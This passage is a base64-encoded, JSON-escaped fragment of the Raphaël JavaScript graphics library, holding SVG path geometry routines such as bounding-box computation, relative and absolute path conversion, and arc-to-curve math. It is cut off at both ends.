GogPCBqajsgaisrKSB7XG4gICAgICAgICAgICAgICAgICAgIHZhciBwaiA9IHBhdGgyW2pdO1xuICAgICAgICAgICAgICAgICAgICBpZiAocGpbMF0gPT0gXCJNXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIHgyID0geDJtID0gcGpbMV07XG4gICAgICAgICAgICAgICAgICAgICAgICB5MiA9IHkybSA9IHBqWzJdO1xuICAgICAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKHBqWzBdID09IFwiQ1wiKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYmV6MiA9IFt4MiwgeTJdLmNvbmNhdChwai5zbGljZSgxKSk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgeDIgPSBiZXoyWzZdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHkyID0gYmV6Mls3XTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYmV6MiA9IFt4MiwgeTIsIHgyLCB5MiwgeDJtLCB5Mm0sIHgybSwgeTJtXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB4MiA9IHgybTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB5MiA9IHkybTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgICAgIHZhciBpbnRyID0gaW50ZXJIZWxwZXIoYmV6MSwgYmV6MiwganVzdENvdW50KTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGlmIChqdXN0Q291bnQpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMgKz0gaW50cjtcbiAgICAgICAgICAgICAgICAgICAgICAgIH0gZWxzZSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgayA9IDAsIGtrID0gaW50ci5sZW5ndGg7IGsgPCBrazsgaysrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludHJba10uc2VnbWVudDEgPSBpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnRyW2tdLnNlZ21lbnQyID0gajtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50cltrXS5iZXoxID0gYmV6MTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50cltrXS5iZXoyID0gYmV6MjtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVzLmNvbmNhdChpbnRyKTtcbiAgICAgICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICByZXR1cm4gcmVzO1xuICAgIH1cbiAgICAvKlxcXG4gICAgICogUmFwaGFlbC5pc1BvaW50SW5zaWRlUGF0aFxuICAgICBbIG1ldGhvZCBdXG4gICAgICoqXG4gICAgICogVXRpbGl0eSBtZXRob2RcbiAgICAgKipcbiAgICAgKiBSZXR1cm5zIGB0cnVlYCBpZiBnaXZlbiBwb2ludCBpcyBpbnNpZGUgYSBnaXZlbiBjbG9zZWQgcGF0aC5cbiAgICAgPiBQYXJhbWV0ZXJzXG4gICAgIC0gcGF0aCAoc3RyaW5nKSBwYXRoIHN0cmluZ1xuICAgICAtIHggKG51bWJlcikgeCBvZiB0aGUgcG9pbnRcbiAgICAgLSB5IChudW1iZXIpIHkgb2YgdGhlIHBvaW50XG4gICAgID0gKGJvb2xlYW4pIHRydWUsIGlmIHBvaW50IGlzIGluc2lkZSB0aGUgcGF0aFxuICAgIFxcKi9cbiAgICBSLmlzUG9pbnRJbnNpZGVQYXRoID0gZnVuY3Rpb24gKHBhdGgsIHgsIHkpIHtcbiAgICAgICAgdmFyIGJib3ggPSBSLnBhdGhCQm94KHBhdGgpO1xuICAgICAgICByZXR1cm4gUi5pc1BvaW50SW5zaWRlQkJveChiYm94LCB4LCB5KSAmJlxuICAgICAgICAgICAgICAgaW50ZXJQYXRoSGVscGVyKHBhdGgsIFtbXCJNXCIsIHgsIHldLCBbXCJIXCIsIGJib3gueDIgKyAxMF1dLCAxKSAlIDIgPT0gMTtcbiAgICB9O1xuICAgIFIuX3JlbW92ZWRGYWN0b3J5ID0gZnVuY3Rpb24gKG1ldGhvZG5hbWUpIHtcbiAgICAgICAgcmV0dXJuIGZ1bmN0aW9uICgpIHtcbiAgICAgICAgICAgIGV2ZShcInJhcGhhZWwubG9nXCIsIG51bGwsIFwiUmFwaGFcXHhlYmw6IHlvdSBhcmUgY2FsbGluZyB0byBtZXRob2QgXFx1MjAxY1wiICsgbWV0aG9kbmFtZSArIFwiXFx1MjAxZCBvZiByZW1vdmVkIG9iamVjdFwiLCBtZXRob2RuYW1lKTtcbiAgICAgICAgfTtcbiAgICB9O1xuICAgIC8qXFxcbiAgICAgKiBSYXBoYWVsLnBhdGhCQm94XG4gICAgIFsgbWV0aG9kIF1cbiAgICAgKipcbiAgICAgKiBVdGlsaXR5IG1ldGhvZFxuICAgICAqKlxuICAgICAqIFJldHVybiBib3VuZGluZyBib3ggb2YgYSBnaXZlbiBwYXRoXG4gICAgID4gUGFyYW1ldGVyc1xuICAgICAtIHBhdGggKHN0cmluZykgcGF0aCBzdHJpbmdcbiAgICAgPSAob2JqZWN0KSBib3VuZGluZyBib3hcbiAgICAgbyB7XG4gICAgIG8gICAgIHg6IChudW1iZXIpIHggY29vcmRpbmF0ZSBvZiB0aGUgbGVmdCB0b3AgcG9pbnQgb2YgdGhlIGJveFxuICAgICBvICAgICB5OiAobnVtYmVyKSB5IGNvb3JkaW5hdGUgb2YgdGhlIGxlZnQgdG9wIHBvaW50IG9mIHRoZSBib3hcbiAgICAgbyAgICAgeDI6IChudW1iZXIpIHggY29vcmRpbmF0ZSBvZiB0aGUgcmlnaHQgYm90dG9tIHBvaW50IG9mIHRoZSBib3hcbiAgICAgbyAgICAgeTI6IChudW1iZXIpIHkgY29vcmRpbmF0ZSBvZiB0aGUgcmlnaHQgYm90dG9tIHBvaW50IG9mIHRoZSBib3hcbiAgICAgbyAgICAgd2lkdGg6IChudW1iZXIpIHdpZHRoIG9mIHRoZSBib3hcbiAgICAgbyAgICAgaGVpZ2h0OiAobnVtYmVyKSBoZWlnaHQgb2YgdGhlIGJveFxuICAgICBvICAgICBjeDogKG51bWJlcikgeCBjb29yZGluYXRlIG9mIHRoZSBjZW50ZXIgb2YgdGhlIGJveFxuICAgICBvICAgICBjeTogKG51bWJlcikgeSBjb29yZGluYXRlIG9mIHRoZSBjZW50ZXIgb2YgdGhlIGJveFxuICAgICBvIH1cbiAgICBcXCovXG4gICAgdmFyIHBhdGhEaW1lbnNpb25zID0gUi5wYXRoQkJveCA9IGZ1bmN0aW9uIChwYXRoKSB7XG4gICAgICAgIHZhciBwdGggPSBwYXRocyhwYXRoKTtcbiAgICAgICAgaWYgKHB0aC5iYm94KSB7XG4gICAgICAgICAgICByZXR1cm4gY2xvbmUocHRoLmJib3gpO1xuICAgICAgICB9XG4gICAgICAgIGlmICghcGF0aCkge1xuICAgICAgICAgICAgcmV0dXJuIHt4OiAwLCB5OiAwLCB3aWR0aDogMCwgaGVpZ2h0OiAwLCB4MjogMCwgeTI6IDB9O1xuICAgICAgICB9XG4gICAgICAgIHBhdGggPSBwYXRoMmN1cnZlKHBhdGgpO1xuICAgICAgICB2YXIgeCA9IDAsXG4gICAgICAgICAgICB5ID0gMCxcbiAgICAgICAgICAgIFggPSBbXSxcbiAgICAgICAgICAgIFkgPSBbXSxcbiAgICAgICAgICAgIHA7XG4gICAgICAgIGZvciAodmFyIGkgPSAwLCBpaSA9IHBhdGgubGVuZ3RoOyBpIDwgaWk7IGkrKykge1xuICAgICAgICAgICAgcCA9IHBhdGhbaV07XG4gICAgICAgICAgICBpZiAocFswXSA9PSBcIk1cIikge1xuICAgICAgICAgICAgICAgIHggPSBwWzFdO1xuICAgICAgICAgICAgICAgIHkgPSBwWzJdO1xuICAgICAgICAgICAgICAgIFgucHVzaCh4KTtcbiAgICAgICAgICAgICAgICBZLnB1c2goeSk7XG4gICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgIHZhciBkaW0gPSBjdXJ2ZURpbSh4LCB5LCBwWzFdLCBwWzJdLCBwWzNdLCBwWzRdLCBwWzVdLCBwWzZdKTtcbiAgICAgICAgICAgICAgICBYID0gWFtjb25jYXRdKGRpbS5taW4ueCwgZGltLm1heC54KTtcbiAgICAgICAgICAgICAgICBZID0gWVtjb25jYXRdKGRpbS5taW4ueSwgZGltLm1heC55KTtcbiAgICAgICAgICAgICAgICB4ID0gcFs1XTtcbiAgICAgICAgICAgICAgICB5ID0gcFs2XTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgfVxuICAgICAgICB2YXIgeG1pbiA9IG1taW5bYXBwbHldKDAsIFgpLFxuICAgICAgICAgICAgeW1pbiA9IG1taW5bYXBwbHldKDAsIFkpLFxuICAgICAgICAgICAgeG1heCA9IG1tYXhbYXBwbHldKDAsIFgpLFxuICAgICAgICAgICAgeW1heCA9IG1tYXhbYXBwbHldKDAsIFkpLFxuICAgICAgICAgICAgd2lkdGggPSB4bWF4IC0geG1pbixcbiAgICAgICAgICAgIGhlaWdodCA9IHltYXggLSB5bWluLFxuICAgICAgICAgICAgICAgIGJiID0ge1xuICAgICAgICAgICAgICAgIHg6IHhtaW4sXG4gICAgICAgICAgICAgICAgeTogeW1pbixcbiAgICAgICAgICAgICAgICB4MjogeG1heCxcbiAgICAgICAgICAgICAgICB5MjogeW1heCxcbiAgICAgICAgICAgICAgICB3aWR0aDogd2lkdGgsXG4gICAgICAgICAgICAgICAgaGVpZ2h0OiBoZWlnaHQsXG4gICAgICAgICAgICAgICAgY3g6IHhtaW4gKyB3aWR0aCAvIDIsXG4gICAgICAgICAgICAgICAgY3k6IHltaW4gKyBoZWlnaHQgLyAyXG4gICAgICAgICAgICB9O1xuICAgICAgICBwdGguYmJveCA9IGNsb25lKGJiKTtcbiAgICAgICAgcmV0dXJuIGJiO1xuICAgIH0sXG4gICAgICAgIHBhdGhDbG9uZSA9IGZ1bmN0aW9uIChwYXRoQXJyYXkpIHtcbiAgICAgICAgICAgIHZhciByZXMgPSBjbG9uZShwYXRoQXJyYXkpO1xuICAgICAgICAgICAgcmVzLnRvU3RyaW5nID0gUi5fcGF0aDJzdHJpbmc7XG4gICAgICAgICAgICByZXR1cm4gcmVzO1xuICAgICAgICB9LFxuICAgICAgICBwYXRoVG9SZWxhdGl2ZSA9IFIuX3BhdGhUb1JlbGF0aXZlID0gZnVuY3Rpb24gKHBhdGhBcnJheSkge1xuICAgICAgICAgICAgdmFyIHB0aCA9IHBhdGhzKHBhdGhBcnJheSk7XG4gICAgICAgICAgICBpZiAocHRoLnJlbCkge1xuICAgICAgICAgICAgICAgIHJldHVybiBwYXRoQ2xvbmUocHRoLnJlbCk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAoIVIuaXMocGF0aEFycmF5LCBhcnJheSkgfHwgIVIuaXMocGF0aEFycmF5ICYmIHBhdGhBcnJheVswXSwgYXJyYXkpKSB7IC8vIHJvdWdoIGFzc3VtcHRpb25cbiAgICAgICAgICAgICAgICBwYXRoQXJyYXkgPSBSLnBhcnNlUGF0aFN0cmluZyhwYXRoQXJyYXkpO1xuICAgICAgICAgICAgfVxuICAgICAgICAgICAgdmFyIHJlcyA9IFtdLFxuICAgICAgICAgICAgICAgIHggPSAwLFxuICAgICAgICAgICAgICAgIHkgPSAwLFxuICAgICAgICAgICAgICAgIG14ID0gMCxcbiAgICAgICAgICAgICAgICBteSA9IDAsXG4gICAgICAgICAgICAgICAgc3RhcnQgPSAwO1xuICAgICAgICAgICAgaWYgKHBhdGhBcnJheVswXVswXSA9PSBcIk1cIikge1xuICAgICAgICAgICAgICAgIHggPSBwYXRoQXJyYXlbMF1bMV07XG4gICAgICAgICAgICAgICAgeSA9IHBhdGhBcnJheVswXVsyXTtcbiAgICAgICAgICAgICAgICBteCA9IHg7XG4gICAgICAgICAgICAgICAgbXkgPSB5O1xuICAgICAgICAgICAgICAgIHN0YXJ0Kys7XG4gICAgICAgICAgICAgICAgcmVzLnB1c2goW1wiTVwiLCB4LCB5XSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBmb3IgKHZhciBpID0gc3RhcnQsIGlpID0gcGF0aEFycmF5Lmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICB2YXIgciA9IHJlc1tpXSA9IFtdLFxuICAgICAgICAgICAgICAgICAgICBwYSA9IHBhdGhBcnJheVtpXTtcbiAgICAgICAgICAgICAgICBpZiAocGFbMF0gIT0gbG93ZXJDYXNlLmNhbGwocGFbMF0pKSB7XG4gICAgICAgICAgICAgICAgICAgIHJbMF0gPSBsb3dlckNhc2UuY2FsbChwYVswXSk7XG4gICAgICAgICAgICAgICAgICAgIHN3aXRjaCAoclswXSkge1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcImFcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzFdID0gcGFbMV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgclsyXSA9IHBhWzJdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbM10gPSBwYVszXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzRdID0gcGFbNF07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcls1XSA9IHBhWzVdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbNl0gPSArKHBhWzZdIC0geCkudG9GaXhlZCgzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzddID0gKyhwYVs3XSAtIHkpLnRvRml4ZWQoMyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwidlwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbMV0gPSArKHBhWzFdIC0geSkudG9GaXhlZCgzKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXCJtXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbXggPSBwYVsxXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBteSA9IHBhWzJdO1xuICAgICAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBqID0gMSwgamogPSBwYS5sZW5ndGg7IGogPCBqajsgaisrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbal0gPSArKHBhW2pdIC0gKChqICUgMikgPyB4IDogeSkpLnRvRml4ZWQoMyk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcbiAgICAgICAgICAgICAgICAgICAgciA9IHJlc1tpXSA9IFtdO1xuICAgICAgICAgICAgICAgICAgICBpZiAocGFbMF0gPT0gXCJtXCIpIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIG14ID0gcGFbMV0gKyB4O1xuICAgICAgICAgICAgICAgICAgICAgICAgbXkgPSBwYVsyXSArIHk7XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICAgICAgZm9yICh2YXIgayA9IDAsIGtrID0gcGEubGVuZ3RoOyBrIDwga2s7IGsrKykge1xuICAgICAgICAgICAgICAgICAgICAgICAgcmVzW2ldW2tdID0gcGFba107XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgdmFyIGxlbiA9IHJlc1tpXS5sZW5ndGg7XG4gICAgICAgICAgICAgICAgc3dpdGNoIChyZXNbaV1bMF0pIHtcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcInpcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIHggPSBteDtcbiAgICAgICAgICAgICAgICAgICAgICAgIHkgPSBteTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiaFwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgeCArPSArcmVzW2ldW2xlbiAtIDFdO1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJ2XCI6XG4gICAgICAgICAgICAgICAgICAgICAgICB5ICs9ICtyZXNbaV1bbGVuIC0gMV07XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICAgICAgICAgIHggKz0gK3Jlc1tpXVtsZW4gLSAyXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIHkgKz0gK3Jlc1tpXVtsZW4gLSAxXTtcbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICByZXMudG9TdHJpbmcgPSBSLl9wYXRoMnN0cmluZztcbiAgICAgICAgICAgIHB0aC5yZWwgPSBwYXRoQ2xvbmUocmVzKTtcbiAgICAgICAgICAgIHJldHVybiByZXM7XG4gICAgICAgIH0sXG4gICAgICAgIHBhdGhUb0Fic29sdXRlID0gUi5fcGF0aFRvQWJzb2x1dGUgPSBmdW5jdGlvbiAocGF0aEFycmF5KSB7XG4gICAgICAgICAgICB2YXIgcHRoID0gcGF0aHMocGF0aEFycmF5KTtcbiAgICAgICAgICAgIGlmIChwdGguYWJzKSB7XG4gICAgICAgICAgICAgICAgcmV0dXJuIHBhdGhDbG9uZShwdGguYWJzKTtcbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIGlmICghUi5pcyhwYXRoQXJyYXksIGFycmF5KSB8fCAhUi5pcyhwYXRoQXJyYXkgJiYgcGF0aEFycmF5WzBdLCBhcnJheSkpIHsgLy8gcm91Z2ggYXNzdW1wdGlvblxuICAgICAgICAgICAgICAgIHBhdGhBcnJheSA9IFIucGFyc2VQYXRoU3RyaW5nKHBhdGhBcnJheSk7XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICBpZiAoIXBhdGhBcnJheSB8fCAhcGF0aEFycmF5Lmxlbmd0aCkge1xuICAgICAgICAgICAgICAgIHJldHVybiBbW1wiTVwiLCAwLCAwXV07XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB2YXIgcmVzID0gW10sXG4gICAgICAgICAgICAgICAgeCA9IDAsXG4gICAgICAgICAgICAgICAgeSA9IDAsXG4gICAgICAgICAgICAgICAgbXggPSAwLFxuICAgICAgICAgICAgICAgIG15ID0gMCxcbiAgICAgICAgICAgICAgICBzdGFydCA9IDA7XG4gICAgICAgICAgICBpZiAocGF0aEFycmF5WzBdWzBdID09IFwiTVwiKSB7XG4gICAgICAgICAgICAgICAgeCA9ICtwYXRoQXJyYXlbMF1bMV07XG4gICAgICAgICAgICAgICAgeSA9ICtwYXRoQXJyYXlbMF1bMl07XG4gICAgICAgICAgICAgICAgbXggPSB4O1xuICAgICAgICAgICAgICAgIG15ID0geTtcbiAgICAgICAgICAgICAgICBzdGFydCsrO1xuICAgICAgICAgICAgICAgIHJlc1swXSA9IFtcIk1cIiwgeCwgeV07XG4gICAgICAgICAgICB9XG4gICAgICAgICAgICB2YXIgY3J6ID0gcGF0aEFycmF5Lmxlbmd0aCA9PSAzICYmIHBhdGhBcnJheVswXVswXSA9PSBcIk1cIiAmJiBwYXRoQXJyYXlbMV1bMF0udG9VcHBlckNhc2UoKSA9PSBcIlJcIiAmJiBwYXRoQXJyYXlbMl1bMF0udG9VcHBlckNhc2UoKSA9PSBcIlpcIjtcbiAgICAgICAgICAgIGZvciAodmFyIHIsIHBhLCBpID0gc3RhcnQsIGlpID0gcGF0aEFycmF5Lmxlbmd0aDsgaSA8IGlpOyBpKyspIHtcbiAgICAgICAgICAgICAgICByZXMucHVzaChyID0gW10pO1xuICAgICAgICAgICAgICAgIHBhID0gcGF0aEFycmF5W2ldO1xuICAgICAgICAgICAgICAgIGlmIChwYVswXSAhPSB1cHBlckNhc2UuY2FsbChwYVswXSkpIHtcbiAgICAgICAgICAgICAgICAgICAgclswXSA9IHVwcGVyQ2FzZS5jYWxsKHBhWzBdKTtcbiAgICAgICAgICAgICAgICAgICAgc3dpdGNoIChyWzBdKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwiQVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbMV0gPSBwYVsxXTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzJdID0gcGFbMl07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgclszXSA9IHBhWzNdO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbNF0gPSBwYVs0XTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzVdID0gcGFbNV07XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgcls2XSA9ICsocGFbNl0gKyB4KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzddID0gKyhwYVs3XSArIHkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICAgICAgY2FzZSBcIlZcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByWzFdID0gK3BhWzFdICsgeTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXCJIXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgclsxXSA9ICtwYVsxXSArIHg7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgICAgICBjYXNlIFwiUlwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkb3RzID0gW3gsIHldW2NvbmNhdF0ocGEuc2xpY2UoMSkpO1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciAodmFyIGogPSAyLCBqaiA9IGRvdHMubGVuZ3RoOyBqIDwgamo7IGorKykge1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RzW2pdID0gK2RvdHNbal0gKyB4O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkb3RzWysral0gPSArZG90c1tqXSArIHk7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJlcy5wb3AoKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZXMgPSByZXNbY29uY2F0XShjYXRtdWxsUm9tMmJlemllcihkb3RzLCBjcnopKTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhc2UgXCJNXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgbXggPSArcGFbMV0gKyB4O1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgIG15ID0gK3BhWzJdICsgeTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGRlZmF1bHQ6XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgZm9yIChqID0gMSwgamogPSBwYS5sZW5ndGg7IGogPCBqajsgaisrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHJbal0gPSArcGFbal0gKyAoKGogJSAyKSA/IHggOiB5KTtcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9IGVsc2UgaWYgKHBhWzBdID09IFwiUlwiKSB7XG4gICAgICAgICAgICAgICAgICAgIGRvdHMgPSBbeCwgeV1bY29uY2F0XShwYS5zbGljZSgxKSk7XG4gICAgICAgICAgICAgICAgICAgIHJlcy5wb3AoKTtcbiAgICAgICAgICAgICAgICAgICAgcmVzID0gcmVzW2NvbmNhdF0oY2F0bXVsbFJvbTJiZXppZXIoZG90cywgY3J6KSk7XG4gICAgICAgICAgICAgICAgICAgIHIgPSBbXCJSXCJdW2NvbmNhdF0ocGEuc2xpY2UoLTIpKTtcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xuICAgICAgICAgICAgICAgICAgICBmb3IgKHZhciBrID0gMCwga2sgPSBwYS5sZW5ndGg7IGsgPCBrazsgaysrKSB7XG4gICAgICAgICAgICAgICAgICAgICAgICByW2tdID0gcGFba107XG4gICAgICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgICAgICB9XG4gICAgICAgICAgICAgICAgc3dpdGNoIChyWzBdKSB7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJaXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICB4ID0gbXg7XG4gICAgICAgICAgICAgICAgICAgICAgICB5ID0gbXk7XG4gICAgICAgICAgICAgICAgICAgICAgICBicmVhaztcbiAgICAgICAgICAgICAgICAgICAgY2FzZSBcIkhcIjpcbiAgICAgICAgICAgICAgICAgICAgICAgIHggPSByWzFdO1xuICAgICAgICAgICAgICAgICAgICAgICAgYnJlYWs7XG4gICAgICAgICAgICAgICAgICAgIGNhc2UgXCJWXCI6XG4gICAgICAgICAgICAgICAgICAgICAgICB5ID0gclsxXTtcbiAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrO1xuICAgICAgICAgICAgICAgICAgICBjYXNlIFwiTVwiOlxuICAgICAgICAgICAgICAgICAgICAgICAgbXggPSByW3IubGVuZ3RoIC0gMl07XG4gICAgICAgICAgICAgICAgICAgICAgICBteSA9IHJbci5sZW5ndGggLSAxXTtcbiAgICAgICAgICAgICAgICAgICAgZGVmYXVsdDpcbiAgICAgICAgICAgICAgICAgICAgICAgIHggPSByW3IubGVuZ3RoIC0gMl07XG4gICAgICAgICAgICAgICAgICAgICAgICB5ID0gcltyLmxlbmd0aCAtIDFdO1xuICAgICAgICAgICAgICAgIH1cbiAgICAgICAgICAgIH1cbiAgICAgICAgICAgIHJlcy50b1N0cmluZyA9IFIuX3BhdGgyc3RyaW5nO1xuICAgICAgICAgICAgcHRoLmFicyA9IHBhdGhDbG9uZShyZXMpO1xuICAgICAgICAgICAgcmV0dXJuIHJlcztcbiAgICAgICAgfSxcbiAgICAgICAgbDJjID0gZnVuY3Rpb24gKHgxLCB5MSwgeDIsIHkyKSB7XG4gICAgICAgICAgICByZXR1cm4gW3gxLCB5MSwgeDIsIHkyLCB4MiwgeTJdO1xuICAgICAgICB9LFxuICAgICAgICBxMmMgPSBmdW5jdGlvbiAoeDEsIHkxLCBheCwgYXksIHgyLCB5Mikge1xuICAgICAgICAgICAgdmFyIF8xMyA9IDEgLyAzLFxuICAgICAgICAgICAgICAgIF8yMyA9IDIgLyAzO1xuICAgICAgICAgICAgcmV0dXJuIFtcbiAgICAgICAgICAgICAgICAgICAgXzEzICogeDEgKyBfMjMgKiBheCxcbiAgICAgICAgICAgICAgICAgICAgXzEzICogeTEgKyBfMjMgKiBheSxcbiAgICAgICAgICAgICAgICAgICAgXzEzICogeDIgKyBfMjMgKiBheCxcbiAgICAgICAgICAgICAgICAgICAgXzEzICogeTIgKyBfMjMgKiBheSxcbiAgICAgICAgICAgICAgICAgICAgeDIsXG4gICAgICAgICAgICAgICAgICAgIHkyXG4gICAgICAgICAgICAgICAgXTtcbiAgICAgICAgfSxcbiAgICAgICAgYTJjID0gZnVuY3Rpb24gKHgxLCB5MSwgcngsIHJ5LCBhbmdsZSwgbGFyZ2VfYXJjX2ZsYWcsIHN3ZWVwX2ZsYWcsIHgyLCB5MiwgcmVjdXJzaXZlKSB7XG4gICAgICAgICAgICAvLyBmb3IgbW9yZSBpbmZvcm1hdGlvbiBvZiB3aGVyZSB0aGlzIG1hdGggY2FtZSBmcm9tIHZpc2l0OlxuICAgICAgICAgICAgLy8gaHR0cDovL3d3dy53My5vcmcvVFIvU1ZHMTEvaW1wbG5vdGUuaHRtbCNBcmNJbXBsZW1lbnRhdGlvbk5vdGVzXG4gICAgICAgICAgICB2YXIgXzEyMCA9IFBJICogMTIwIC8gMTgwLFxuICAgICAgICAgICAgICAgIHJhZCA9IFBJIC8gMTgwICogKCthbmdsZSB8fCAwKSxcbiAgICAgICAgICAgICAgICByZXMgPSBbXSxcbiAgICAgICAgICAgICAgICB4eSxcbiAgICAgICAgICAgICAgICByb3RhdGUgPSBjYWNoZXIoZnVuY3Rpb24gKHgsIHksIHJhZCkge1xuICAgICAgICAgICAgICAgICAgICB2YXIgWCA9IHggKiBtYXRoLmNvcyhyYWQpIC0geSAqIG1hdGguc2luKHJhZCksXG4gICAgICAgICAgICAgICAgICAgICAgICBZID0geCAqIG1hdGguc2luKHJhZCkgKyB5ICogbWF0aC5jb3MocmFkKTtcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHt4OiBYLCB5OiBZfTtcbiAgICAgICAgICAgICAgICB9KTtcbiAgICAgICAgICAgIGlmICghcmVjdXJzaXZlKSB7XG4gICAgICAgICAgICAgICAgeHkgPSByb3RhdGUoeDEsIHkxLCAtcmFkKTtcbiAgICAgICAgICAgICAgICB4MSA9IHh5Lng7XG4gICAgICAgICAgICAgICAgeTEgPSB4eS55O1xuICAgICAgICAgICAgICAgIHh5ID0gcm90YXRlKHgyLCB5MiwgLXJhZCk7XG4gICAgICAgICAgICAgICAgeDIgPSB4eS54O1xuICAgICAg